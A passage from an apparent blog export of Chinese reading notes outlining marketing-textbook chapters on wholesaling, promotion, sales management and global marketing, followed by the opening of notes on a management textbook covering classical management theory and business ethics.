<li>承担风险。批发商拥有货物的所有权而要承担风险并承担商品被盗窃、破坏、损耗和陈旧老化的费用。</li>
<li>市场信息。批发商将有关竞争者、新产品和价格发展的信息提供给供应商和顾客。</li>
<li>管理服务和咨询。批发商经常帮助零售商训练他们的售货员, 改进商店布局和陈列, 并建立会计和存货控制制度。</li>
</ul>
<h3 id="批发商的类型"><a href="#批发商的类型" class="headerlink" title="批发商的类型"></a>批发商的类型</h3><img src = "2018_11_04_17.png">

<h3 id="批发商市场营销决策"><a href="#批发商市场营销决策" class="headerlink" title="批发商市场营销决策"></a>批发商市场营销决策</h3><ul>
<li>目标市场和定位决策</li>
<li>市场组合决策</li>
</ul>
<h3 id="批发业的趋势"><a href="#批发业的趋势" class="headerlink" title="批发业的趋势"></a>批发业的趋势</h3><h3 id="案例十四-山姆的俱乐部-扩充规模应付竞争"><a href="#案例十四-山姆的俱乐部-扩充规模应付竞争" class="headerlink" title="案例十四 山姆的俱乐部: 扩充规模应付竞争"></a>案例十四 山姆的俱乐部: 扩充规模应付竞争</h3><h2 id="第十五章、产品促销-营销沟通策略"><a href="#第十五章、产品促销-营销沟通策略" class="headerlink" title="第十五章、产品促销: 营销沟通策略"></a>第十五章、产品促销: 营销沟通策略</h2><h3 id="发展有效沟通的步骤"><a href="#发展有效沟通的步骤" class="headerlink" title="发展有效沟通的步骤"></a>发展有效沟通的步骤</h3><ul>
<li>确定目标接收者</li>
<li>决定所寻求的反应</li>
<li>选择信息<ul>
<li>信息内容<ul>
<li>理性的呼吁( Rational Appeals ) 与接受者自身的利益有关</li>
<li>感性的呼吁( Emotional Appeals ) 旨在激起消极或积极的情绪, 以刺激购买</li>
<li>道德呼吁(Moral Appeals) 是针对接受者有关什么是“对的”和“适当的”之理解</li>
</ul>
</li>
<li>信息结构</li>
<li>信息格式</li>
</ul>
</li>
<li>选择媒体<ul>
<li>人员沟通渠道</li>
<li>非人员沟通渠道</li>
</ul>
</li>
<li>选择信息来源</li>
<li>收集反馈</li>
</ul>
<h3 id="制定全盘的促销预算和组合"><a href="#制定全盘的促销预算和组合" class="headerlink" title="制定全盘的促销预算和组合"></a>制定全盘的促销预算和组合</h3><ul>
<li>编制全盘促销预算<ul>
<li>量力而行法</li>
<li>销售额百分比法</li>
<li>竞争平衡法</li>
<li>目标任务法</li>
</ul>
</li>
<li>制定促销组合<ul>
<li>各种促销工具的特性<ul>
<li>广告</li>
<li>人员推销</li>
<li>营业推广</li>
<li>公共关系</li>
</ul>
</li>
<li>制定促销组合的因素<ul>
<li>产品&#x2F; 市场类型</li>
<li>推式与拉式策略</li>
<li>购买者准备阶段</li>
<li>产品生命周期阶段</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="市场营销沟通变化中的一面"><a href="#市场营销沟通变化中的一面" class="headerlink" title="市场营销沟通变化中的一面"></a>市场营销沟通变化中的一面</h3><ul>
<li>变化中的沟通环境</li>
<li>直接市场营销的成长<ul>
<li>直接市场营销沟通的形式<ul>
<li>直接邮寄和目录市场营销</li>
<li>电话市场营销</li>
<li>电视市场营销</li>
<li>联机购物</li>
</ul>
</li>
<li>直接市场营销数据库</li>
<li>一体化直接市场营销</li>
</ul>
</li>
<li>一体化市场营销沟通</li>
</ul>
<h3 id="在社会上应负责任的市场营销沟通"><a href="#在社会上应负责任的市场营销沟通" class="headerlink" title="在社会上应负责任的市场营销沟通"></a>在社会上应负责任的市场营销沟通</h3><ul>
<li>广告</li>
<li>人员推销</li>
<li>直接市场营销<ul>
<li>激怒, 不公平, 欺诈和蒙骗</li>
<li>隐私的侵犯</li>
</ul>
</li>
</ul>
<h3 id="案例十五-雅芳-Avon-一个促销策略的改造"><a href="#案例十五-雅芳-Avon-一个促销策略的改造" class="headerlink" title="案例十五 雅芳(Avon ) : 一个促销策略的改造"></a>案例十五 雅芳(Avon ) : 一个促销策略的改造</h3><h2 id="第十六章、产品促销-广告、营业推广与公共关系"><a href="#第十六章、产品促销-广告、营业推广与公共关系" class="headerlink" title="第十六章、产品促销: 广告、营业推广与公共关系"></a>第十六章、产品促销: 广告、营业推广与公共关系</h2><h3 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h3><h3 id="广告的主要决策"><a href="#广告的主要决策" class="headerlink" title="广告的主要决策"></a>广告的主要决策</h3><ul>
<li>制定目标  <img src = "2018_11_04_18.png"></li>
<li>广告预算的编制<ul>
<li>产品生命周期阶段</li>
<li>市场份额</li>
<li>竞争与干扰</li>
<li>广告次数</li>
<li>产品差异</li>
</ul>
</li>
<li>广告策略<ul>
<li>创造广告信息<ul>
<li>变化的信息环境</li>
<li>信息策略</li>
<li>信息制作<ul>
<li>生活片段</li>
<li>生活方式</li>
<li>幻境</li>
<li>情调或形象</li>
<li>音乐</li>
<li>人物象征</li>
<li>专业技术</li>
<li>科学证据</li>
<li>表扬的证据</li>
</ul>
</li>
</ul>
</li>
<li>选择广告媒体<ul>
<li>确定广告的接触度、频率与效果</li>
<li>选择主要媒体类型</li>
<li>选择特定的媒体工具</li>
<li>决定媒体时间</li>
</ul>
</li>
</ul>
</li>
<li>广告评估<ul>
<li>衡量沟通效果</li>
<li>衡量销售效果</li>
</ul>
</li>
<li>国际广告决策</li>
</ul>
<h3 id="营业推广"><a href="#营业推广" class="headerlink" title="营业推广"></a>营业推广</h3><ul>
<li>营业推广的快速成长</li>
<li>营业推广的目的</li>
<li>设立营业推广目标</li>
<li>选择营业推广工具<ul>
<li>消费者促销工具<ul>
<li>样品(Samples)</li>
<li>代金券(Coupons)</li>
<li>现金退款(Cash Refund Offers或Rebates)</li>
<li>特价包装(Price Packs )</li>
<li>奖品(Premiums)</li>
<li>广告特赠品(Advertizing Specialties)</li>
<li>光顾奖赏(Patronge Rewards)</li>
<li>购买点(Point-of-Purchase POP)</li>
<li>比赛、抽奖和游戏(Contests, Sweepstakes and Games)</li>
</ul>
</li>
<li>中间商促销工具</li>
<li>企业促销工具</li>
</ul>
</li>
<li>拟定营业推广方案</li>
</ul>
<h3 id="公共关系"><a href="#公共关系" class="headerlink" title="公共关系"></a>公共关系</h3><ul>
<li>公共关系部门所执行的是以下的任何或所有的功能<ul>
<li>新闻界关系或新闻代理: 创造并将有新闻价值的信息刊登于新闻媒体, 以引起大众对某些人物、产品或服务的注意。</li>
<li>产品宣传: 宣传某些特定的产品。</li>
<li>公共事务: 建立和维持国内和当地的社区关系。</li>
<li>游说: 建立和维持与立法者及政府官员的良好关系, 以影响有利于公司的立法和规章。</li>
<li>投资者关系: 维持与股东和其他金融界人物的关系。</li>
<li>发展: 发展与捐款人或非盈利组织会员的公共关系以赢得财务上或志愿者的支持</li>
</ul>
</li>
<li>公共关系的主要工具</li>
<li>公共关系的主要决策<ul>
<li>设定公共关系目标</li>
<li>选择公共关系的信息和工具</li>
<li>执行公共关系方案</li>
<li>评估公共关系活动的成果</li>
</ul>
</li>
</ul>
<h3 id="案例十六-汉堡王-Burger-King-寻找正确的信息"><a href="#案例十六-汉堡王-Burger-King-寻找正确的信息" class="headerlink" title="案例十六 汉堡王( Burger King) : 寻找正确的信息"></a>案例十六 汉堡王( Burger King) : 寻找正确的信息</h3><h2 id="第十七章、产品促销-人员推销与销售管理"><a href="#第十七章、产品促销-人员推销与销售管理" class="headerlink" title="第十七章、产品促销: 人员推销与销售管理"></a>第十七章、产品促销: 人员推销与销售管理</h2><h3 id="人员推销的角色"><a href="#人员推销的角色" class="headerlink" title="人员推销的角色"></a>人员推销的角色</h3><ul>
<li>人员推销的性质</li>
<li>销售人员的角色</li>
</ul>
<h3 id="管理销售人员"><a href="#管理销售人员" class="headerlink" title="管理销售人员"></a>管理销售人员</h3><ul>
<li>设计销售人员的策略和结构<ul>
<li>销售人员结构<ul>
<li>地区销售人员结构</li>
<li>产品销售人员结构</li>
<li>顾客销售人员结构</li>
<li>综合销售人员结构</li>
</ul>
</li>
<li>销售人员的规模</li>
<li>其他销售人员策略和结构问题<ul>
<li>外勤和内部销售人员</li>
<li>小组销售</li>
</ul>
</li>
</ul>
</li>
<li>销售人员的招募与甄选<ul>
<li>优秀销售人员的条件是什么?</li>
<li>招募的程序</li>
<li>遴选销售人员</li>
</ul>
</li>
<li>培训销售人员</li>
<li>销售人员的酬劳  <img src = "2018_11_04_20.png"></li>
<li>销售人员的监督<ul>
<li>销售人员的指导</li>
<li>决定目标顾客和访问方式</li>
<li>有效地运用销售时间</li>
<li>销售人员的激励<ul>
<li>组织气氛</li>
<li>销售配额</li>
<li>正面的激励</li>
</ul>
</li>
</ul>
</li>
<li>销售人员的评估<ul>
<li>信息来源</li>
<li>正式的绩效评估<ul>
<li>销售人员绩效的比较</li>
<li>本期与前期销售额的比较</li>
<li>销售人员的定性评估</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="人员推销的原则"><a href="#人员推销的原则" class="headerlink" title="人员推销的原则"></a>人员推销的原则</h3><ul>
<li>人员推销的过程</li>
<li>推销过程的步骤<ul>
<li>发掘和选拔合格者</li>
<li>事前筹划</li>
<li>接近</li>
<li>介绍和示范</li>
<li>应付反对意见</li>
<li>成交</li>
<li>事后追踪</li>
</ul>
</li>
<li>关系市场营销</li>
</ul>
<h3 id="案例十七-国际商用机器公司-IBM-重组销售人员"><a href="#案例十七-国际商用机器公司-IBM-重组销售人员" class="headerlink" title="案例十七 国际商用机器公司( IBM) : 重组销售人员"></a>案例十七 国际商用机器公司( IBM) : 重组销售人员</h3><h2 id="第十八章、通过满意、价值和质量建立与顾客的关系"><a href="#第十八章、通过满意、价值和质量建立与顾客的关系" class="headerlink" title="第十八章、通过满意、价值和质量建立与顾客的关系"></a>第十八章、通过满意、价值和质量建立与顾客的关系</h2><h3 id="顾客价值和满意的定义"><a href="#顾客价值和满意的定义" class="headerlink" title="顾客价值和满意的定义"></a>顾客价值和满意的定义</h3><ul>
<li>顾客价值</li>
<li>顾客满意</li>
</ul>
<h3 id="交付顾客价值和满意"><a href="#交付顾客价值和满意" class="headerlink" title="交付顾客价值和满意"></a>交付顾客价值和满意</h3><ul>
<li>价值链</li>
<li>价值交付系统</li>
</ul>
<h3 id="保留顾客"><a href="#保留顾客" class="headerlink" title="保留顾客"></a>保留顾客</h3><ul>
<li>损失顾客的成本</li>
<li>顾客保留的必要</li>
<li>关键: 顾客关系市场营销<ul>
<li>财务上的利益</li>
<li>社会的利益</li>
<li>结构的联系</li>
</ul>
</li>
<li>最后的测试: 顾客盈利能力</li>
</ul>
<h3 id="实施总的质量市场营销"><a href="#实施总的质量市场营销" class="headerlink" title="实施总的质量市场营销"></a>实施总的质量市场营销</h3><ul>
<li>全面质量管理</li>
<li>市场营销对全面质量的作用</li>
</ul>
<h3 id="案例十八-牛排店-打破常规"><a href="#案例十八-牛排店-打破常规" class="headerlink" title="案例十八 牛排店: 打破常规"></a>案例十八 牛排店: 打破常规</h3><h2 id="第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略"><a href="#第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略" class="headerlink" title="第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略"></a>第十九章、创造竞争性优势——竞争者分析和竞争性市场营销策略</h2><h3 id="竞争对手分析"><a href="#竞争对手分析" class="headerlink" title="竞争对手分析"></a>竞争对手分析</h3><ul>
<li>识别公司的竞争者</li>
<li>确定竞争者对手的目标</li>
<li>识别竞争者的策略</li>
<li>评估竞争者的长处和短处</li>
<li>估计竞争者的反应</li>
<li>选择攻击对象与回避对象<ul>
<li>强大或弱小的竞争者</li>
<li>接近或疏远竞争者</li>
<li>“品行良好”或“具破坏性”的竞争者</li>
</ul>
</li>
<li>设计竞争情报系统</li>
</ul>
<h3 id="基本的竞争性策略"><a href="#基本的竞争性策略" class="headerlink" title="基本的竞争性策略"></a>基本的竞争性策略</h3><ul>
<li>基本的竞争策略<ul>
<li>3种制胜的策略<ul>
<li>总成本领先</li>
<li>差异化</li>
<li>集中化</li>
</ul>
</li>
<li>价值准则<ul>
<li>卓越经营</li>
<li>顾客的亲密关系</li>
<li>产品领导地位</li>
</ul>
</li>
</ul>
</li>
<li>竞争的地位</li>
<li>市场领导者的策略<ul>
<li>扩展整个市场<ul>
<li>新的使用者</li>
<li>新用途</li>
<li>更多的用量</li>
</ul>
</li>
<li>保护市场份额</li>
<li>扩充市场份额</li>
</ul>
</li>
<li>市场挑战者的策略<ul>
<li>确定策略目标和竞争者</li>
<li>选择市场攻击策略</li>
</ul>
</li>
<li>市场跟随者的策略</li>
<li>市场填补者的策略</li>
</ul>
<h3 id="平衡消费者和竞争者导向"><a href="#平衡消费者和竞争者导向" class="headerlink" title="平衡消费者和竞争者导向"></a>平衡消费者和竞争者导向</h3><h3 id="案例十九-宝洁公司-走向全球——在化妆品中一种新的方法"><a href="#案例十九-宝洁公司-走向全球——在化妆品中一种新的方法" class="headerlink" title="案例十九 宝洁公司: 走向全球——在化妆品中一种新的方法"></a>案例十九 宝洁公司: 走向全球——在化妆品中一种新的方法</h3><h2 id="第二十章、全球市场"><a href="#第二十章、全球市场" class="headerlink" title="第二十章、全球市场"></a>第二十章、全球市场</h2><h3 id="进入-21-世纪的全球市场营销"><a href="#进入-21-世纪的全球市场营销" class="headerlink" title="进入 21 世纪的全球市场营销"></a>进入 21 世纪的全球市场营销</h3><h3 id="考察全球的市场营销环境"><a href="#考察全球的市场营销环境" class="headerlink" title="考察全球的市场营销环境"></a>考察全球的市场营销环境</h3><ul>
<li>国际贸易体系<ul>
<li>关贸总协定</li>
<li>区域的自由贸易区</li>
</ul>
</li>
<li>经济环境<ul>
<li>国家的产业结构<ul>
<li>自给自足经济(Subsistence Economies)</li>
<li>原材料出口经济(Raw-Material-Exporting Economies)</li>
<li>开发中经济(Industrializing Economies)</li>
<li>工业经济(Industrial Economies)</li>
</ul>
</li>
<li>收入分配<ul>
<li>赤贫</li>
<li>均贫</li>
<li>贫富悬殊</li>
<li>贫、富、中产阶级并存</li>
<li>大部分为中等家庭收入</li>
</ul>
</li>
</ul>
</li>
<li>政治—法律环境<ul>
<li>对国际采购的态度</li>
<li>政治的稳定性</li>
<li>金融管制</li>
<li>政府的官僚</li>
</ul>
</li>
<li>文化环境</li>
</ul>
<h3 id="决定是否向海外发展"><a href="#决定是否向海外发展" class="headerlink" title="决定是否向海外发展"></a>决定是否向海外发展</h3><h3 id="决定进入哪些市场"><a href="#决定进入哪些市场" class="headerlink" title="决定进入哪些市场"></a>决定进入哪些市场</h3><img src = "2018_11_04_19.png">

<h3 id="决定如何进入市场"><a href="#决定如何进入市场" class="headerlink" title="决定如何进入市场"></a>决定如何进入市场</h3><ul>
<li>出口</li>
<li>合资经营<ul>
<li>授权许可( Licensing)</li>
<li>契约生产</li>
<li>管理契约</li>
<li>合资所有制</li>
</ul>
</li>
<li>直接投资</li>
</ul>
<h3 id="拟定全球市场营销方案"><a href="#拟定全球市场营销方案" class="headerlink" title="拟定全球市场营销方案"></a>拟定全球市场营销方案</h3><ul>
<li>产品</li>
<li>促销</li>
<li>定价</li>
<li>销售渠道</li>
</ul>
<h3 id="决定全球市场营销组织"><a href="#决定全球市场营销组织" class="headerlink" title="决定全球市场营销组织"></a>决定全球市场营销组织</h3><h3 id="案例二十-哈迪公司-Hardee’-s-在韩国的市场营销"><a href="#案例二十-哈迪公司-Hardee’-s-在韩国的市场营销" class="headerlink" title="案例二十 哈迪公司(Hardee’ s) : 在韩国的市场营销"></a>案例二十 哈迪公司(Hardee’ s) : 在韩国的市场营销</h3><h2 id="第二十一章、服务、组织、人物、地点与概念的营销"><a href="#第二十一章、服务、组织、人物、地点与概念的营销" class="headerlink" title="第二十一章、服务、组织、人物、地点与概念的营销"></a>第二十一章、服务、组织、人物、地点与概念的营销</h2><h3 id="服务市场营销"><a href="#服务市场营销" class="headerlink" title="服务市场营销"></a>服务市场营销</h3><ul>
<li>服务的本质和特点<ul>
<li>无形性</li>
<li>不可分离性</li>
<li>不稳定性</li>
<li>易消逝性</li>
</ul>
</li>
<li>服务公司的市场营销策略<ul>
<li>管理差异</li>
<li>管理服务质量</li>
<li>管理生产率</li>
</ul>
</li>
<li>国际服务市场营销</li>
</ul>
<h3 id="组织市场营销"><a href="#组织市场营销" class="headerlink" title="组织市场营销"></a>组织市场营销</h3><ul>
<li>形象的评估</li>
<li>形象规划与控制</li>
</ul>
<h3 id="人物市场营销"><a href="#人物市场营销" class="headerlink" title="人物市场营销"></a>人物市场营销</h3><h3 id="地方市场营销"><a href="#地方市场营销" class="headerlink" title="地方市场营销"></a>地方市场营销</h3><ul>
<li>营业用地营销( Bus iness Site Marketing )</li>
<li>旅游营销( T our ism Market ing)</li>
</ul>
<h3 id="概念营销"><a href="#概念营销" class="headerlink" title="概念营销"></a>概念营销</h3><h3 id="案例二十一-城市年-City-Year-像企业一样经营一个非盈利组织"><a href="#案例二十一-城市年-City-Year-像企业一样经营一个非盈利组织" class="headerlink" title="案例二十一 城市年( City Year ) : 像企业一样经营一个非盈利组织"></a>案例二十一 城市年( City Year ) : 像企业一样经营一个非盈利组织</h3><h2 id="第二十二章、市场营销与社会-社会责任与市场营销道德"><a href="#第二十二章、市场营销与社会-社会责任与市场营销道德" class="headerlink" title="第二十二章、市场营销与社会: 社会责任与市场营销道德"></a>第二十二章、市场营销与社会: 社会责任与市场营销道德</h2><h3 id="社会对营销活动的批评"><a href="#社会对营销活动的批评" class="headerlink" title="社会对营销活动的批评"></a>社会对营销活动的批评</h3><ul>
<li>市场营销对个别消费者的影响<ul>
<li>高价格<ul>
<li>分销成本高</li>
<li>高广告和促销费用</li>
<li>超额加成</li>
</ul>
</li>
<li>欺诈行为</li>
<li>高压推销</li>
<li>劣质或不安全产品</li>
<li>有计划地使产品过时</li>
<li>对社会地位低下的消费者服务质量差</li>
</ul>
</li>
<li>市场营销对整个社会的冲击<ul>
<li>错误的欲望和过度的物质主义</li>
<li>社会公共财物太少</li>
<li>文化污染</li>
<li>政治权势过大</li>
</ul>
</li>
<li>市场营销对其它企业的冲击</li>
</ul>
<h3 id="市民与公众行动对市场营销的管制"><a href="#市民与公众行动对市场营销的管制" class="headerlink" title="市民与公众行动对市场营销的管制"></a>市民与公众行动对市场营销的管制</h3><ul>
<li>消费者主义</li>
<li>环境保护主义</li>
<li>对市场营销管理的公众行动</li>
</ul>
<h3 id="企业走向对社会负责任的市场营销"><a href="#企业走向对社会负责任的市场营销" class="headerlink" title="企业走向对社会负责任的市场营销"></a>企业走向对社会负责任的市场营销</h3><ul>
<li>进步的市场营销观念<ul>
<li>消费者导向营销</li>
<li>创新市场营销</li>
<li>价值市场营销</li>
<li>使命感市场营销</li>
<li>社会市场营销</li>
</ul>
</li>
<li>市场营销的道德观</li>
</ul>
<h3 id="市场营销公共政策的原则"><a href="#市场营销公共政策的原则" class="headerlink" title="市场营销公共政策的原则"></a>市场营销公共政策的原则</h3><ul>
<li>消费者和生产者自由原则</li>
<li>抑制潜在伤害原则</li>
<li>满足基本需求原则</li>
<li>经济效率原则</li>
<li>创新原则</li>
<li>消费者教育和充分信息原则</li>
<li>消费者保护原则</li>
</ul>
<h3 id="案例二十二-雀巢公司-又遭到攻击"><a href="#案例二十二-雀巢公司-又遭到攻击" class="headerlink" title="案例二十二 雀巢公司: 又遭到攻击"></a>案例二十二 雀巢公司: 又遭到攻击</h3>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>读书笔记————管理学第三版</title>
    <url>/blogs/2018-10-27-readingNoteManagement/</url>
    <content><![CDATA[<h1 id="管理学（第三版）"><a href="#管理学（第三版）" class="headerlink" title="管理学（第三版）"></a>管理学（第三版）</h1><ul>
<li>主编：周三多</li>
</ul>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><img src = "2018_10_31_04.bmp">

<h2 id="第一篇、总论"><a href="#第一篇、总论" class="headerlink" title="第一篇、总论"></a>第一篇、总论</h2><h3 id="一、管理活动与管理理论"><a href="#一、管理活动与管理理论" class="headerlink" title="一、管理活动与管理理论"></a>一、管理活动与管理理论</h3><ul>
<li>管理活动<ul>
<li>管理的定义<ul>
<li>组织为了达到个人无法实现的目标，通过各项职能活动，合理分配、协调相关资源的过程。</li>
<li>进一步解释<ul>
<li>管理的载体是组织</li>
<li>管理的本质是合理分配和协调各种资源的过程，而不是其他</li>
<li>管理的对象是相关资源，即包括人力资源在内的一切可以调用的资源</li>
<li>管理的职能活动包括信息、决策、计划、组织、领导、控制和创新</li>
<li>管理的目的是为了实现既定的目标，而该目标仅凭单个人的力量是无法实现的，这也是建立组织的原因</li>
</ul>
</li>
</ul>
</li>
<li>管理的职能  <img src = "2018_10_27_01.bmp">
  * 决策是计划的前提，计划是决策的逻辑延续。管理者在行使其他管理职能的过程中总会面临决策和计划的问题，决策和计划是其他管理职能的依据。
  * 组织、领导和控制旨在保证决策的顺利实施。
  * 创新贯穿于各种管理职能和各个组织层次之中。</li>
<li>管理者的角色与技能<ul>
<li>管理者的角色  <img src = "2018_10_27_02.bmp"></li>
<li>管理者的技能  <img src = "2018_10_27_03.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>中外早期管理思想<ul>
<li>中国早期管理思想<ul>
<li>2 000 多年前的春秋时代，杰出的军事家孙武著有《孙子兵法》一书</li>
<li>战国时代的另一本书《周礼》对封建国家的管理体制进行了理想化的设计</li>
<li>战国时代的军事家孙嫔运用运筹学和对策论的思想，帮助田忌在赛马中胜了齐王</li>
<li>中国古代管理思想在许多著作中都有体现，如《孙子兵法》、《周礼》、《墨子》、《老子》、《管子》、《齐民要术》、《天工开物》等</li>
</ul>
</li>
<li>外国早期管理思想<ul>
<li>亚当·斯密(Adam Smith ,1723一1790) 的劳动分工观点和经济人观点</li>
<li>小瓦特(James Watt Jr. ,1769一1848) 和博尔顿(Mattew R. Boulton,1770一1842) 的科学管理制度</li>
<li>马萨诸塞车祸与所有权和管理权的分离</li>
<li>欧文( Robert Owen, 1771一1858 ) 的人事管理</li>
<li>巴贝奇( Charles Bab bag , 1 792—1871 ) 的作业研究和报酬制度</li>
<li>亨利· 汤( Henry R. Towne,1844—1924 ) 的收益分享制度</li>
<li>哈尔西 (Frederick A. Halsey, 1856一193I)’的 奖金方案</li>
</ul>
</li>
</ul>
</li>
<li>管理理论的形成与发展<ul>
<li>古典管理理论<ul>
<li>科学管理理论<ul>
<li>泰罗的贡献<ul>
<li>工作定额</li>
<li>标准化</li>
<li>能力与工作相适应</li>
<li>差别计件工资制</li>
<li>计划职能与执行职能相分离</li>
</ul>
</li>
<li>其他人的贡献<ul>
<li>美国工程师弗兰克· 吉尔布雷斯及其夫人莉莲·吉尔布雷斯在动作研究和工作简化方面做出了突出贡献</li>
<li>美国管理学家、机械工程师甘特是泰罗在米德维尔钢铁公司和伯利恒钢铁公司的重要合作者。他最重要的贡献是他创造的“甘特图”，这是一种用线条表示的计划图</li>
</ul>
</li>
</ul>
</li>
<li>组织管理理论<ul>
<li>法约尔的贡献<ul>
<li>企业的基本活动和管理的五种职能<ul>
<li>技术活动，指生产、制造和加工。</li>
<li>商业活动，指采购、销售和交换。</li>
<li>财务活动，指资金的筹措、运用和控制。</li>
<li>安全活动，指设备的维护和人员的保护</li>
<li>会计活动，指货物盘点、成本统计和核算。</li>
<li>管理活动，指计划、组织、指挥、协调和控制</li>
</ul>
</li>
<li>管理的14条原则<ul>
<li>分工</li>
<li>权力与责任</li>
<li>纪律</li>
<li>统一指挥</li>
<li>统一领导</li>
<li>个人利益服从集体利益</li>
<li>报酬合理</li>
<li>集权与分权</li>
<li>等级链与跳板</li>
<li>秩序</li>
<li>公平</li>
<li>人员稳定</li>
<li>首创精神</li>
<li>集体精神</li>
</ul>
</li>
</ul>
</li>
<li>韦伯的贡献<ul>
<li>理想的行政组织体系<ul>
<li>存在明确的分工</li>
<li>按等级原则对各种公职或职位进行法定安排，形成一个自上而下的指挥链或等级体系</li>
<li>根据经过正式考试或教育培训而获得的技术资格来选拔员工，并完全根据职务的要求来任用。</li>
<li>除个别需要通过选举产生的公职以外，所有担任公职的人都是任命的</li>
<li>行政管理人员是“专职的“管理人员，领取固定的”薪金”，有明文规定的升迁制度。</li>
<li>行政管理人员不是其管辖的企业的所有者，只是其中的工作人员</li>
<li>行政管理人员必须严格遵守组织中的规则、纪律和办事程序</li>
<li>组织中成员之间的关系以理性准则为指导，不受个人情感的影响</li>
</ul>
</li>
</ul>
</li>
<li>巴纳德的贡献<ul>
<li>经理人员的职能<ul>
<li>建立并维护一个信息系统</li>
<li>使组织中每个人都能做出贡献</li>
<li>明确组织的目标</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>行为管理理论<ul>
<li>梅奥(George E. Mayo ,1880—1949) 及其领导的霍桑试验</li>
<li>行为科学</li>
</ul>
</li>
<li>数量管理理论<ul>
<li>运筹学</li>
<li>系统分析<ul>
<li>确定系统的最终目标，同时明确每个特定阶段的目标和任务</li>
<li>必须把研究对象视作一个整体，一个统一的系统，然后确定每个局部要解决的任务，研究它们之间以及它们与总体目标之间的相互关系和相互影响</li>
<li>寻求完成总体目标及各个局部任务的可供选择的方案</li>
<li>对可供选择的方案进行分析和比较，选出最优方案</li>
<li>实施组织所选方案</li>
</ul>
</li>
<li>决策科学化</li>
</ul>
</li>
<li>系统管理理论<ul>
<li>系统管理理论是指运用系统理论中的范畴、原理，对组织中的管理活动和管理过程，特别是组织结构和模式进行分析的理论</li>
<li>组织是一个系统，是由相互联系、相互依存的要素构成的</li>
<li>系统在一定的环境下生存，与环境进行物质、能量和信息的交换</li>
<li>运用系统观点来考察管理的基本职能，可以提高组织的整体效率，使管理人员不至于只重视某些与自己有关的特殊职能而忽视了大目标，也不至于忽视自已在组织中的地位和作用</li>
</ul>
</li>
<li>权变管理理论<ul>
<li>权变管理理论是20世纪70年代在美国形成的一种管理理论。这一理论的核心是力图研究组织与环境的联系，并确定各种变揖的关系类型和结构类型。它强调管理要根据组织所处的环境随机应变，针对不同的环境寻求相应的管理模式。</li>
</ul>
</li>
<li>全面质量管理<ul>
<li>全面质昼管理的本质是由顾客需求和期望驱动企业持续不断改善的管理理念<ul>
<li>关注顾客</li>
<li>注重持续改善</li>
<li>关注流程</li>
<li>精确测董</li>
<li>授权于员工</li>
</ul>
</li>
</ul>
</li>
<li>20世纪90年代的管理理论新发展<ul>
<li>学习型组织</li>
<li>精益思想</li>
<li>业务流程再造</li>
<li>核心能力理论</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="二、管理道德与企业社会责任"><a href="#二、管理道德与企业社会责任" class="headerlink" title="二、管理道德与企业社会责任"></a>二、管理道德与企业社会责任</h3><ul>
<li>管理与伦理道德<ul>
<li>伦理道德的真谛<ul>
<li>伦理与道德作为人类文明的基本因子，是指评价人类行为善与恶的社会价值形态，在日常生活中具体表现为一定的行为规范和准则。任何社会任何组织要想长期生存，不仅需要遵守法律，同时还必须遵守一定的道德规范。</li>
</ul>
</li>
<li>伦理道德的管理学意义<ul>
<li>经济与经营活动的意义，尤其是对终极意义的追求</li>
<li>企业组织</li>
<li>人文力与企业精神</li>
<li>企业及其产品的价值观</li>
</ul>
</li>
</ul>
</li>
<li>几种相关的道德观<ul>
<li>功利主义道德观<ul>
<li>这种观点认为，能给行为影响所及的大多数人带来最大利益的行为才是善的<ul>
<li>功利主义道德观有其合理的一面，因为人类的行为一般都是基于动机，动机就是期望行为带来某些有利的结果</li>
<li>存在两个不可回避的问题<ul>
<li>为了实现最大利益，可能采取了不公平、不道德甚至损害了他人或社会利益的手段</li>
<li>只是规定了对大多数人有利，而没有规定所得利益如何在相关人员中分配，所以很可能产生利益分配不公，一小部分人利用手中的职权或资本，获取了绝大部分的利益，而大部分人只得到了一小部分的利益，形成贫富两极分化的现象，这也是不道德的</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>权利至上道德观<ul>
<li>这种观点认为，能尊重和保护个人基本权利的行为才是善的</li>
<li>权利至上的道德观对组织而言，在管理实践中也有消极的一面<ul>
<li>因为组织整体利益的需要和个人的权利不可能完全一致</li>
</ul>
</li>
</ul>
</li>
<li>公平公正道德观<ul>
<li>这种观点认为，管理者不能因种族、肤色、性别、个性、个人爱好、国籍、户籍等因素对部分员工歧视，而那些按照同工同酬的原则和公平公正的标准向员工支付薪酬的行为是善的</li>
<li>这种道德观在理论上是完全正确的，但在实践中情况却十分复杂</li>
</ul>
</li>
<li>社会契约道德观<ul>
<li>这种观点认为，只要按照企业所在地区政府和员工都能接受的社会契约所进行的管理行为就是善的</li>
<li>契约论的道德观有很大的局限性。因为契约具有很强的情境特征，在很多场合是相关各方利益博弈的结果，与合理性无关</li>
</ul>
</li>
<li>推己及人道德观<ul>
<li>许多成功的管理者在决定管理行为时，都学会了“换位思考”‘.. 将心比心” 、“设身处地”考虑问题。他们十分重视对上级的“忠诚”，对下属的“仁爱”；对朋友的“义气”和“诚信”以及各方面关系的”和谐”</li>
<li>在竞争激烈的社会中，推己及人的道德观却经常被讥讽为“书生气”‘或“竞争不力”的诟病</li>
</ul>
</li>
</ul>
</li>
<li>道德管理的特征和影响管理道德的因素<ul>
<li>道德管理的特征<ul>
<li>合乎道德的管理不仅把遵守道德规范视作组织获取利益的一种手段，而且更把其视作组织的一项责任</li>
<li>合乎道德的管理不仅从组织自身角度更应从社会整体角度看问题</li>
<li>合乎道德的管理尊重所有者以外的利益相关者的利益，善于处理组织与利益相关者的关系，也善于处理管理者与一般员工及一般员工内部的关系</li>
<li>合乎道德的管理不仅把人看作手段，更把人看作目的</li>
<li>合乎道德的管理超越了法律的要求，能让组织取得卓越的成就</li>
<li>合乎道德的管理具有自律的特征</li>
<li>合乎道德的管理以组织的价值观为行为导向</li>
</ul>
</li>
